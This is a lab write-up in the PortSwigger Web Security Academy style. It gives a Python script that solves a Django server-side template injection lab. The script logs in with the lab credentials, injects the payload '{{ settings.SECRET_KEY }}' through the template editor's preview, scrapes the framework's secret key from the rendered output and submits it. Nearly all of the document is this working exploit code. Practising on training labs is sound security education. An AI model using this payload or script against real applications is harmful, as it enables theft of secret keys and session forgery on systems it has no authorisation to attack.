# Server-side template injection with information disclosure via user-supplied objects

> This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
> To solve the lab, steal and submit the framework's secret key.
> You can log in to your own account using the following credentials:
> `content-manager:C0nt3ntM4n4g3r`

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Server-side template injection with information disclosure (Django)
# GOAL: Extract the Django SECRET_KEY and submit it to solve the lab.
BASE_URL = "https://0ada004004bf98c98000264800de0027.web-security-academy.net"

def get_csrf_token(session, url):
    """
    Extracts the anti-CSRF token from the given URL.
    """
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find("input", {"name": "csrf"})['value']

def create_authenticated_session(base_url):
    """
    Logs in as the content-manager and returns the active session.
    """
    login_url = f"{base_url}/login"
    session = requests.Session()
    
    print(f"[*] Authenticating at {login_url}...")
    csrf_token = get_csrf_token(session, login_url)
    
    credentials = {
        "username": "content-manager",
        "password": "C0nt3ntM4n4g3r",
        "csrf": csrf_token
    }
    
    response = session.post(login_url, data=credentials)
    
    if "Log out" in response.text:
        print("[+] Login Successful.")
        return session
    else:
        print("[-] Login Failed.")
        sys.exit(1)

def exploit_django_ssti(base_url, session):
    """
    Injects a Django template payload to extract the SECRET_KEY and submits it.
    """
    # 1. Define Endpoints
    template_url = f"{base_url}/product/template?productId=1"
    submit_url = f"{base_url}/submitSolution"
    
    print(f"[*] Targeting Template Editor: {template_url}")
    
    # 2. Construct Payload
    # We use the Django template syntax {{ variable }} to access the exposed 'settings' object.
    payload_string = "{{ settings.SECRET_KEY }}"
    
    csrf_token = get_csrf_token(session, template_url)
    
    data = {
        "template": payload_string,
        "template-action": "preview",
        "csrf": csrf_token
    }
    
    # 3. Extract the Secret Key
    print(f"[*] Sending Payload: {payload_string}")
    response = session.post(template_url, data=data)
    
    # Parse the 'Preview' section to find the rendered key
    soup = BeautifulSoup(response.text, 'html.parser')
    # The lab renders the output inside a div with id 'preview-result' (or we scrape the whole text)
    # Refined extraction: The key is likely the only text in the preview if we replaced the whole template
    # But usually, we just look for the string in the specific container.
    # Note: In this lab, the output is often just the text. We will strip whitespace.
    secret_key = soup.find("div", {"id": "preview-result"}).text.strip()
    
    print(f"[+] Extracted SECRET_KEY: {secret_key}")
    
    # 4. Submit the Solution
    print(f"[*] Submitting Key to {submit_url}...")
    submission_data = {"answer": secret_key}
    
    submit_response = session.post(submit_url, data=submission_data)
    
    # 5. Validate Success
    # PortSwigger submit endpoints usually return JSON like {"correct": true} 
    # or we can check the response text.
    if "true" in submit_response.text.lower():
        print("[SUCCESS] The Secret Key was accepted. Lab Solved!")
    else:
        print("[-] Submission failed. Check the extracted key.")

if __name__ == "__main__":
    session = create_authenticated_session(BASE_URL)
    exploit_django_ssti(BASE_URL, session)
```